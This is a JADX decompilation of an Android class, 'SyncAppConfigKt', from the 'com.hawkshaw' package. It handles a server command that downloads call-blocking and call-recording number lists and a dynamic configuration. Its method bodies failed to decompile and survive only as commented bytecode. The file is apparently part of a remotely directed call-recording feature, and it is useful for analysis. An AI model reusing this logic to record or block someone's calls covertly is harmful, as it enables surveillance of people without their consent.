package com.hawkshaw.library.handler;

import com.hawkshaw.library.datalayer.models.Command;
import java.util.List;

public final class SyncAppConfigKt {
    private static final String TAG = "SyncAppConfig";

    /* JADX WARNING: type inference failed for: r0v2, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0043  */
    /* JADX WARNING: Removed duplicated region for block: B:26:0x0068  */
    /* JADX WARNING: Removed duplicated region for block: B:31:0x007b  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0025  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object handleSyncAppConfig(com.hawkshaw.library.datalayer.models.Command r7, a3.e r8) {
        /*
            boolean r0 = r8 instanceof T1.e
            if (r0 == 0) goto L_0x0013
            r0 = r8
            T1.e r0 = (T1.e) r0
            int r1 = r0.f1918F
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1918F = r1
            goto L_0x0018
        L_0x0013:
            T1.e r0 = new T1.e
            r0.<init>(r8)
        L_0x0018:
            java.lang.Object r8 = r0.f1917E
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1918F
            W2.y r3 = W2.y.f2418a
            r4 = 3
            r5 = 2
            r6 = 1
            if (r2 == 0) goto L_0x0043
            if (r2 == r6) goto L_0x003d
            if (r2 == r5) goto L_0x0037
            if (r2 != r4) goto L_0x002f
            Y1.C0110h.P(r8)
            goto L_0x0087
        L_0x002f:
            java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
            java.lang.String r8 = "call to 'resume' before 'invoke' with coroutine"
            r7.<init>(r8)
            throw r7
        L_0x0037:
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest r7 = r0.f1916D
            Y1.C0110h.P(r8)
            goto L_0x0073
        L_0x003d:
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest r7 = r0.f1916D
            Y1.C0110h.P(r8)
            goto L_0x0060
        L_0x0043:
            Y1.C0110h.P(r8)
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest r7 = r7.getSyncAppConfigRequest()
            if (r7 != 0) goto L_0x004d
            return r3
        L_0x004d:
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest$SyncType r8 = com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest.SyncType.CallBlocking
            boolean r8 = sync(r7, r8)
            if (r8 == 0) goto L_0x0060
            r0.f1916D = r7
            r0.f1918F = r6
            java.lang.Object r8 = syncCallBlocking(r0)
            if (r8 != r1) goto L_0x0060
            return r1
        L_0x0060:
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest$SyncType r8 = com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest.SyncType.CallRecording
            boolean r8 = sync(r7, r8)
            if (r8 == 0) goto L_0x0073
            r0.f1916D = r7
            r0.f1918F = r5
            java.lang.Object r8 = syncCallRecording(r0)
            if (r8 != r1) goto L_0x0073
            return r1
        L_0x0073:
            com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest$SyncType r8 = com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest.SyncType.DynamicConfig
            boolean r7 = sync(r7, r8)
            if (r7 == 0) goto L_0x0087
            r7 = 0
            r0.f1916D = r7
            r0.f1918F = r4
            java.lang.Object r7 = syncDynamicConfig(r0)
            if (r7 != r1) goto L_0x0087
            return r1
        L_0x0087:
            return r3
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.handler.SyncAppConfigKt.handleSyncAppConfig(com.hawkshaw.library.datalayer.models.Command, a3.e):java.lang.Object");
    }

    private static final boolean sync(Command.SyncAppConfigRequest syncAppConfigRequest, Command.SyncAppConfigRequest.SyncType syncType) {
        List<Command.SyncAppConfigRequest.SyncType> syncTypes = syncAppConfigRequest.getSyncTypes();
        if (syncTypes != null && syncTypes.contains(syncType)) {
            return true;
        }
        List<Command.SyncAppConfigRequest.SyncType> syncTypes2 = syncAppConfigRequest.getSyncTypes();
        return syncTypes2 != null && syncTypes2.contains(Command.SyncAppConfigRequest.SyncType.All);
    }

    /* JADX WARNING: type inference failed for: r0v5, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x004a  */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0067  */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x00a2 A[LOOP:0: B:26:0x009c->B:28:0x00a2, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:31:0x00bf A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object syncCallBlocking(a3.e r8) {
        /*
            boolean r0 = r8 instanceof T1.f
            if (r0 == 0) goto L_0x0013
            r0 = r8
            T1.f r0 = (T1.f) r0
            int r1 = r0.f1923H
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1923H = r1
            goto L_0x0018
        L_0x0013:
            T1.f r0 = new T1.f
            r0.<init>(r8)
        L_0x0018:
            java.lang.Object r8 = r0.f1922G
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1923H
            r3 = 3
            r4 = 2
            r5 = 1
            if (r2 == 0) goto L_0x004a
            if (r2 == r5) goto L_0x0046
            if (r2 == r4) goto L_0x003a
            if (r2 != r3) goto L_0x0032
            java.lang.Object r0 = r0.f1919D
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r0 = (com.hawkshaw.library.datalayer.room.telephony.TelephonyDao) r0
            Y1.C0110h.P(r8)
            goto L_0x00c0
        L_0x0032:
            java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r8.<init>(r0)
            throw r8
        L_0x003a:
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r2 = r0.f1921F
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r4 = r0.f1920E
            java.lang.Object r5 = r0.f1919D
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r5 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r5
            Y1.C0110h.P(r8)
            goto L_0x007f
        L_0x0046:
            Y1.C0110h.P(r8)
            goto L_0x0060
        L_0x004a:
            Y1.C0110h.P(r8)
            com.hawkshaw.library.datalayer.Injector$Companion r8 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r8 = r8.getInstance()
            com.hawkshaw.library.datalayer.network.service.AppConfigService r8 = r8.getAppConfig()
            r0.f1923H = r5
            java.lang.Object r8 = r8.getCallBlockList(r0)
            if (r8 != r1) goto L_0x0060
            return r1
        L_0x0060:
            r5 = r8
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r5 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r5
            boolean r8 = r5 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success
            if (r8 == 0) goto L_0x00cc
            com.hawkshaw.library.datalayer.room.AppDatabase r8 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r2 = r8.telephonyDao()
            r0.f1919D = r5
            r0.f1920E = r2
            r0.f1921F = r2
            r0.f1923H = r4
            java.lang.Object r8 = r2.nukeCallBlockNumbers(r0)
            if (r8 != r1) goto L_0x007e
            return r1
        L_0x007e:
            r4 = r2
        L_0x007f:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse$Success r5 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success) r5
            java.lang.Object r8 = r5.getResult()
            com.hawkshaw.library.datalayer.models.GetCallBlockListResponse r8 = (com.hawkshaw.library.datalayer.models.GetCallBlockListResponse) r8
            java.util.List r8 = r8.getList()
            java.lang.Iterable r8 = (java.lang.Iterable) r8
            java.util.ArrayList r5 = new java.util.ArrayList
            r6 = 10
            int r6 = X2.l.L0(r8, r6)
            r5.<init>(r6)
            java.util.Iterator r8 = r8.iterator()
        L_0x009c:
            boolean r6 = r8.hasNext()
            if (r6 == 0) goto L_0x00b0
            java.lang.Object r6 = r8.next()
            com.hawkshaw.library.datalayer.models.GetCallBlockListResponse$CallBlock r6 = (com.hawkshaw.library.datalayer.models.GetCallBlockListResponse.CallBlock) r6
            com.hawkshaw.library.datalayer.room.telephony.CallBlockEntity r6 = r6.toCallBlockEntity()
            r5.add(r6)
            goto L_0x009c
        L_0x00b0:
            r0.f1919D = r4
            r8 = 0
            r0.f1920E = r8
            r0.f1921F = r8
            r0.f1923H = r3
            java.lang.Object r8 = r2.saveCallBlockNumbers(r5, r0)
            if (r8 != r1) goto L_0x00c0
            return r1
        L_0x00c0:
            com.hawkshaw.library.logger.Logger r2 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r4 = "SyncCallBlocking: synced"
            r5 = 0
            java.lang.String r3 = "SyncAppConfig"
            r6 = 4
            r7 = 0
            com.hawkshaw.library.logger.Logger.d$default(r2, r3, r4, r5, r6, r7)
        L_0x00cc:
            W2.y r8 = W2.y.f2418a
            return r8
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.handler.SyncAppConfigKt.syncCallBlocking(a3.e):java.lang.Object");
    }

    /* JADX WARNING: type inference failed for: r0v5, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x004a  */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x0067  */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x00a2 A[LOOP:0: B:26:0x009c->B:28:0x00a2, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:31:0x00bf A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0023  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object syncCallRecording(a3.e r8) {
        /*
            boolean r0 = r8 instanceof T1.g
            if (r0 == 0) goto L_0x0013
            r0 = r8
            T1.g r0 = (T1.g) r0
            int r1 = r0.f1928H
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1928H = r1
            goto L_0x0018
        L_0x0013:
            T1.g r0 = new T1.g
            r0.<init>(r8)
        L_0x0018:
            java.lang.Object r8 = r0.f1927G
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1928H
            r3 = 3
            r4 = 2
            r5 = 1
            if (r2 == 0) goto L_0x004a
            if (r2 == r5) goto L_0x0046
            if (r2 == r4) goto L_0x003a
            if (r2 != r3) goto L_0x0032
            java.lang.Object r0 = r0.f1924D
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r0 = (com.hawkshaw.library.datalayer.room.telephony.TelephonyDao) r0
            Y1.C0110h.P(r8)
            goto L_0x00c0
        L_0x0032:
            java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r8.<init>(r0)
            throw r8
        L_0x003a:
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r2 = r0.f1926F
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r4 = r0.f1925E
            java.lang.Object r5 = r0.f1924D
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r5 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r5
            Y1.C0110h.P(r8)
            goto L_0x007f
        L_0x0046:
            Y1.C0110h.P(r8)
            goto L_0x0060
        L_0x004a:
            Y1.C0110h.P(r8)
            com.hawkshaw.library.datalayer.Injector$Companion r8 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r8 = r8.getInstance()
            com.hawkshaw.library.datalayer.network.service.AppConfigService r8 = r8.getAppConfig()
            r0.f1928H = r5
            java.lang.Object r8 = r8.getCallRecordList(r0)
            if (r8 != r1) goto L_0x0060
            return r1
        L_0x0060:
            r5 = r8
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r5 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r5
            boolean r8 = r5 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success
            if (r8 == 0) goto L_0x00cc
            com.hawkshaw.library.datalayer.room.AppDatabase r8 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.telephony.TelephonyDao r2 = r8.telephonyDao()
            r0.f1924D = r5
            r0.f1925E = r2
            r0.f1926F = r2
            r0.f1928H = r4
            java.lang.Object r8 = r2.nukeCallRecordNumbers(r0)
            if (r8 != r1) goto L_0x007e
            return r1
        L_0x007e:
            r4 = r2
        L_0x007f:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse$Success r5 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success) r5
            java.lang.Object r8 = r5.getResult()
            com.hawkshaw.library.datalayer.models.GetCallRecordListResponse r8 = (com.hawkshaw.library.datalayer.models.GetCallRecordListResponse) r8
            java.util.List r8 = r8.getList()
            java.lang.Iterable r8 = (java.lang.Iterable) r8
            java.util.ArrayList r5 = new java.util.ArrayList
            r6 = 10
            int r6 = X2.l.L0(r8, r6)
            r5.<init>(r6)
            java.util.Iterator r8 = r8.iterator()
        L_0x009c:
            boolean r6 = r8.hasNext()
            if (r6 == 0) goto L_0x00b0
            java.lang.Object r6 = r8.next()
            com.hawkshaw.library.datalayer.models.GetCallRecordListResponse$CallRecord r6 = (com.hawkshaw.library.datalayer.models.GetCallRecordListResponse.CallRecord) r6
            com.hawkshaw.library.datalayer.room.telephony.CallRecordEntity r6 = r6.toCallRecordEntity()
            r5.add(r6)
            goto L_0x009c
        L_0x00b0:
            r0.f1924D = r4
            r8 = 0
            r0.f1925E = r8
            r0.f1926F = r8
            r0.f1928H = r3
            java.lang.Object r8 = r2.saveCallRecordNumbers(r5, r0)
            if (r8 != r1) goto L_0x00c0
            return r1
        L_0x00c0:
            com.hawkshaw.library.logger.Logger r2 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r4 = "SyncCallRecording: synced"
            r5 = 0
            java.lang.String r3 = "SyncAppConfig"
            r6 = 4
            r7 = 0
            com.hawkshaw.library.logger.Logger.d$default(r2, r3, r4, r5, r6, r7)
        L_0x00cc:
            W2.y r8 = W2.y.f2418a
            return r8
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.handler.SyncAppConfigKt.syncCallRecording(a3.e):java.lang.Object");
    }

    /* JADX WARNING: type inference failed for: r0v5, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x002f  */
    /* JADX WARNING: Removed duplicated region for block: B:17:0x004b  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object syncDynamicConfig(a3.e r7) {
        /*
            boolean r0 = r7 instanceof T1.h
            if (r0 == 0) goto L_0x0013
            r0 = r7
            T1.h r0 = (T1.h) r0
            int r1 = r0.f1930E
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1930E = r1
            goto L_0x0018
        L_0x0013:
            T1.h r0 = new T1.h
            r0.<init>(r7)
        L_0x0018:
            java.lang.Object r7 = r0.f1929D
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1930E
            r3 = 1
            if (r2 == 0) goto L_0x002f
            if (r2 != r3) goto L_0x0027
            Y1.C0110h.P(r7)
            goto L_0x0045
        L_0x0027:
            java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r7.<init>(r0)
            throw r7
        L_0x002f:
            Y1.C0110h.P(r7)
            com.hawkshaw.library.datalayer.Injector$Companion r7 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r7 = r7.getInstance()
            com.hawkshaw.library.datalayer.network.service.AppConfigService r7 = r7.getAppConfig()
            r0.f1930E = r3
            java.lang.Object r7 = r7.getDynamicConfig(r0)
            if (r7 != r1) goto L_0x0045
            return r1
        L_0x0045:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r7 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r7
            boolean r0 = r7 instanceof com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success
            if (r0 == 0) goto L_0x0073
            com.hawkshaw.library.preferences.Prefs r0 = com.hawkshaw.library.preferences.Prefs.INSTANCE
            F3.b r1 = com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt.getJson()
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse$Success r7 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse.Success) r7
            java.lang.Object r7 = r7.getResult()
            r1.getClass()
            com.hawkshaw.library.datalayer.models.DynamicConfig$Companion r2 = com.hawkshaw.library.datalayer.models.DynamicConfig.Companion
            kotlinx.serialization.KSerializer r2 = r2.serializer()
            java.lang.String r7 = r1.b(r2, r7)
            r0.setDynamicConfig(r7)
            com.hawkshaw.library.logger.Logger r1 = com.hawkshaw.library.logger.Logger.INSTANCE
            r5 = 4
            r6 = 0
            java.lang.String r2 = "SyncAppConfig"
            java.lang.String r3 = "SyncDynamicConfig: synced"
            r4 = 0
            com.hawkshaw.library.logger.Logger.d$default(r1, r2, r3, r4, r5, r6)
        L_0x0073:
            W2.y r7 = W2.y.f2418a
            return r7
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.handler.SyncAppConfigKt.syncDynamicConfig(a3.e):java.lang.Object");
    }
}
